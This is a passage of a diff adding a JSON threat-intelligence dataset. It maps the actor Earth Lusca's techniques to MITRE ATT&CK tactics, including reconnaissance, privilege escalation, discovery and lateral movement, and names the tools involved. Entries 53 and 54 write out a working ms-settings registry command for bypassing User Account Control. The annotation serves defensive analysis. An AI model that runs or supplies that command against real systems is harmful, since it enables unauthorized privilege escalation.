+                        "T1590-Gather Victim Network Information"
+                    ],
+                    "id": 45
+                },
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "download",
+                    "Object": "PowerView.ps1",
+                    "ObjectType": "file",
+                    "tactic": "Reconnaissance",
+                    "technique": [
+                        "T1595-Active Scanning",
+                        "T1592-Gather Victim Host Information",
+                        "T1590-Gather Victim Network Information"
+                    ],
+                    "id": 46
+                },
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "discover",
+                    "Object": "machines in the same domain",
+                    "ObjectType": "infrastructure",
+                    "tactic": "Reconnaissance",
+                    "technique": [
+                        "T1595-Active Scanning",
+                        "T1592-Gather Victim Host Information",
+                        "T1590-Gather Victim Network Information"
+                    ],
+                    "id": 47
+                }
+            ]
+        },
+        "Privilege Escalation": {
+            "T1548-Abuse Elevation Control Mechanism": [
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "abuse of elevation control mechanisms",
+                    "ObjectType": "technique",
+                    "tactic": "Privilege Escalation",
+                    "technique": [
+                        "T1548-Abuse Elevation Control Mechanism"
+                    ],
+                    "id": 48
+                },
+                {
+                    "Subject": "reg add HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\Shell\\Open\\command\\ /t REG_SZ /d \"%appdata%\\[file name]\" /f",
+                    "SubjectType": "command",
+                    "Relation": "bypass",
+                    "Object": "User Account Control (UAC)",
+                    "ObjectType": "technique",
+                    "tactic": "Privilege Escalation",
+                    "technique": [
+                        "T1548-Abuse Elevation Control Mechanism"
+                    ],
+                    "id": 53
+                },
+                {
+                    "Subject": "reg add HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\Shell\\Open\\command\\ /t REG_SZ /d \"%appdata%\\[file name]\" /f",
+                    "SubjectType": "command",
+                    "Relation": "gain",
+                    "Object": "elevated privileges",
+                    "ObjectType": "technique",
+                    "tactic": "Privilege Escalation",
+                    "technique": [
+                        "T1548-Abuse Elevation Control Mechanism"
+                    ],
+                    "id": 54
+                }
+            ],
+            "T1543-Create or Modify System Process": [
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "create",
+                    "Object": "system processes",
+                    "ObjectType": "technique",
+                    "tactic": "Privilege Escalation",
+                    "technique": [
+                        "T1543-Create or Modify System Process"
+                    ],
+                    "id": 49
+                },
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "modify",
+                    "Object": "system processes",
+                    "ObjectType": "technique",
+                    "tactic": "Privilege Escalation",
+                    "technique": [
+                        "T1543-Create or Modify System Process"
+                    ],
+                    "id": 50
+                }
+            ],
+            "T1574-Hijack Execution Flow": [
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "hijack",
+                    "Object": "execution flow",
+                    "ObjectType": "technique",
+                    "tactic": "Privilege Escalation",
+                    "technique": [
+                        "T1574-Hijack Execution Flow"
+                    ],
+                    "id": 51
+                }
+            ]
+        },
+        "Discovery": {
+            "T1046-Network Service Discovery": [
+                {
+                    "Subject": "threat actor",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "HUC Port Banner Scanner",
+                    "ObjectType": "tool",
+                    "tactic": "Discovery",
+                    "technique": [
+                        "T1046-Network Service Discovery"
+                    ],
+                    "id": 55
+                },
+                {
+                    "Subject": "threat actor",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "nbtscan",
+                    "ObjectType": "tool",
+                    "tactic": "Discovery",
+                    "technique": [
+                        "T1046-Network Service Discovery"
+                    ],
+                    "id": 56
+                },
+                {
+                    "Subject": "threat actor",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "fscan",
+                    "ObjectType": "tool",
+                    "tactic": "Discovery",
+                    "technique": [
+                        "T1046-Network Service Discovery"
+                    ],
+                    "id": 57
+                },
+                {
+                    "Subject": "threat actor",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "hbs.exe",
+                    "ObjectType": "file",
+                    "tactic": "Discovery",
+                    "technique": [
+                        "T1046-Network Service Discovery"
+                    ],
+                    "id": 58
+                }
+            ]
+        },
+        "Lateral Movement": {
+            "T1210-Exploitation of Remote Services": [
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "engage in",
+                    "Object": "lateral movement",
+                    "ObjectType": "Tactic",
+                    "tactic": "Lateral Movement",
+                    "technique": [
+                        "T1210-Exploitation of Remote Services"
+                    ],
+                    "id": 59
+                },
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "exploit",
+                    "Object": "remote services",
+                    "ObjectType": "infrastructure",
+                    "tactic": "Lateral Movement",
+                    "technique": [
+                        "T1210-Exploitation of Remote Services"
+                    ],
+                    "id": 60
+                }
+            ],
+            "T1534-Internal Spearphishing": [
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "internal spear phishing",
+                    "ObjectType": "Technique",
+                    "tactic": "Lateral Movement",
+                    "technique": [
+                        "T1534-Internal Spearphishing"
+                    ],
+                    "id": 61
+                }
+            ],
+            "T1570-Lateral Tool Transfer": [
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "transfer",
+                    "Object": "tools",
+                    "ObjectType": "tool",
+                    "tactic": "Lateral Movement",
+                    "technique": [
+                        "T1570-Lateral Tool Transfer"
+                    ],
+                    "id": 62
+                },
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "lcx",
+                    "ObjectType": "tool",
+                    "tactic": "Lateral Movement",
+                    "technique": [
+                        "T1570-Lateral Tool Transfer"
+                    ],
+                    "id": 64
+                },
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "frp",
+                    "ObjectType": "tool",
+                    "tactic": "Lateral Movement",
+                    "technique": [
+                        "T1570-Lateral Tool Transfer"
+                    ],
+                    "id": 65
+                }
+            ]
+        }
+    }
+}
